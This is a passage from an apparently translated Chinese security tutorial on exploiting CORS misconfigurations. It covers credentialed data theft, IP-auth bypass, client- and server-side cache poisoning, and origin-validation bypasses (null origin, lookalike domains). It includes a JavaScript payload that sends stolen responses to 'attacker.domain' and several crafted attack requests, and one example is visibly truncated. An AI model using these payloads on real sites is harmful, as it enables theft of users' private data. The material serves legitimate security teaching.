### 3.2.1 泄露用户数据
当“Access-Control-Allow-Credentials”设置为Ture时，利用这种CORS这种配置缺陷的基本技术就是创建一个JavaScript脚本去发送CORS请求，就像下面那样：
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open(“get”,”https://vulnerable.domain/api/private-data”,true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
    location=”//attacker.domain/log?response=”+this.responseText;
    };
用这样的代码黑客就可以通过有缺陷的“日志”接口偷到用户数据。  
当带有目标系统用户凭据的受害者访问带有上述代码的页面的时候，浏览器就会发送下面的请求到“有漏洞服务器”
    GET /api/private-data HTTP/1.1
    Host: vulnerable.domain
    Origin: https://attacker.domain/
    Cookie: JSESSIONID=
然后就会收到下面的返回数据
    HTTP/1.1 200 OK
    Server: Apache-Coyote/1.1
    Access-Control-Allow-Origin: https://attacker.domain
    Access-Control-Allow-Credentials: true
    Access-Control-Expose-Headers: Access-Control-Allow-Origin,Access-Control-Allow-Credentials
    Vary: Origin
    Expires: Thu, 01 Jan 1970 12:00:00 GMT
    Last-Modified: Wed, 02 May 2018 09:07:07 GMT
    Cache-Control: no-store, no-cache, must-revalidate, max-age=0, post-check=0, pre-check=0
    Pragma: no-cache
    Content-Type: application/json;charset=ISO-8859-1
    Date: Wed, 02 May 2018 09:07:07 GMT
    Connection: close
    Content-Length: 149
    {"id":1234567,"name":"Name","surname":"Surname","email":"PI:EMAIL","account":"ACT1234567","balance":"123456,7","token":"to
    p-secret-string"}
因为服务器发送了头部字段“Access-Control-Allow-*”给客户端，所以，受害者浏览器允许包含恶意JavaScript代码的页面访问用户的隐私数据。  
## 3.3 没有用户凭据的利用方式
在这种情况下，目标应用允许通过发送“Origin”去影响返回头“Access-Control-Allow-Origin”的值，但是不允许传输用户凭证  
下面这个表简要说明基于CORS配置的可利用性
“Access-Control-Allow-Origin” 值 | 是否可利用  
---|---  
 | 是  
null | 是  
* | 是  
如果不能携带用户凭据的话，那么就会减少攻击者的攻击面，并且很明显的是，攻击者将很难拿到用户的cookie。此外，会话固定攻击也是不可行的，因为浏览器会忽略应用设置的新的cookie。
### 3.3.1 绕过基于ip的身份验证
实际的攻击中总有意外，如果目标从受害者的网络中可以到达，但使用ip地址作为身份验证的方式。这种情况通常发生在缺乏严格控制的内网中。  
在这种场景下，黑客会利用受害者的浏览器作为代理去访问那些应用并且可以绕过那些基于ip的身份验证。就影响而言，这个类似于DNS重绑定，但会更容易利用。
### 3.3.2 客户端缓存中毒
这种配置允许攻击者利用其他的漏洞。  
比如，一个应用返回数据报文头部中包含“X-User”这个字段，这个字段的值没有经过验证就直接输出到返回页面上。
请求：
    GET /login HTTP/1.1
    Host: www.target.local
    Origin: https://attacker.domain/
    X-User: 
返回报文（注意：“Access-Control-Allow-Origin”已经被设置，但是“Access-Control-Allow-Credentials: true”并且“Vary: Origin”头没有被设置）
    HTTP/1.1 200 OK
    Access-Control-Allow-Origin: https://attacker.domain/
    …
    Content-Type: text/html
    …
    Invalid user: ');
    req.send();
    function reqListener() {
    location='http://www.target.local/login';
    }
如果在返回报文中头部没有设置“Vary:
Origin”，那么可以利用上面展示的例子，可以让受害者浏览器中的缓存中存储返回数据报文（这要基于浏览器的行为）并且当浏览器访问到相关URL的时候就会直接显示出来。（通过重定向来实现，可以用“reqListener()”这个方法）  
如果没有CORS的话，上面的缺陷就没法利用，因为没有办法让受害者浏览器发送自定义头部，但是如果有了CORS，就可以用“XMLHttpRequest”做这个事情。
### 3.3.3 服务器端缓存中毒
另一种潜在的攻击方式是利用CORS的错误配置注入HTTP头部，这可能会被服务器端缓存下来，比如制造存储型xss  
下面是攻击的利用条件：
  * 存在服务器端缓存 
  * 能够反射“Origin“头部 
  * 不会检查“Origin”头部中的特殊字符，比如”\r"  
有了上面的先决条件，James
Kettle展示了http头部注入的利用方式，他用这种方式攻击IE/Edge用户（因为他们使用“\r"(0x0d)作为的HTTP头部字段的终结符）  
请求
        GET / HTTP/1.1
    Origin: z[0x0d]Content-Type: text/html; charset=UTF-7
IE处理过后返回报文
        HTTP/1.1 200 OK
    Access-Control-Allow-Origin: z
    Content-Type: text/html; charset=UTF-7
上面的请求不能直接拿来利用，因为攻击者没有办法保证受害者浏览器会提前发送畸形的头部。  
如果攻击者能提前发送畸形的“Origin”头部，比如利用代理或者命令行的方式发送，然后服务器就会缓存这样的返回报文并且也会传递给其他人。  
利用上面的例子，攻击者可以把页面的编码变成”UTF-7"，周所周知，这可能会引发xss漏洞
## 3.4 绕过技术
有时，需要信任不同的域或者所有的子域，所以开发者要用正则表达式或者其他的方法去验证有效性。  
下面的部分列出了一系列的“起源”，可以用来绕过某些验证控制，以验证“起源”头的有效性。
下面的例子中的目标域一般指“target.local”。
### 3.4.1 NULL源
CORS的规范中还提到了“NULL”源。触发这个源是为了网页跳转或者是来自本地HTML文件。  
目标应用可能会接收“null"源，并且这个可能被测试者（或者攻击者）利用，意外任何网站很容易使用沙盒iframe来获取”null“源
使用上面的iframe产生一个请求类似于下面这样
    GET /handler
    Host: target.local
    Origin: null
如果目标应用接收”null"源，那么服务器将返回类似下面的数据报文
    HTTP/1.1 200 OK
    Acess-Control-Allow-Origin: null
    Access-Control-Allow-Credentials: true
这种错误配置经常会碰到，所以会很方便的去尝试它。
### 3.4.2 使用目标域名作为子域名
如果目标应用只检查只检查“Origin”中的字符串是否包含“target.local”，那么就可以在自己控制的服务器上创建一个子域名。  
用这样的方式，请求一般产生自JavaScript代码，并且请求中的“Origin”会像下面这样
    Origin: https://target.local.attacker.domain
### 3.4.3 注册一个同名的域名
假设，目标应用实现是基于下面的正则表达式去检测“Origin”头部的话：
    ^https?:\/\/.*\.?target\.local$
这样的正则表达式包含一个问题，导则这样的CORS配置都容易被攻击。下面表格将分解正则表达式：
Part | 描述  
---|---  
.* | 除了终止符的任何字符  
\\. | 一个点  
? | 在这里匹配一个“.”一次或者零次  
这个?只影响"."这个字符串，因此在“target.local”前面的任何字符串都是被允许的，而不管是否有"."把他们分开。  
因此，只需要在“origin”末尾包含目标域名就可以绕过上面的限制（这个场景的的目标域名是“  
target.local”），比如：
    Origin: https://nottarget.local
攻击者只需要注册一个末尾包含目标域名的新域名就可以利用这样的漏洞了。
### 3.4.4 控制目标的子域名
现在目标应用实现是基于下面的正则表达式去检测“Origin”头部的话：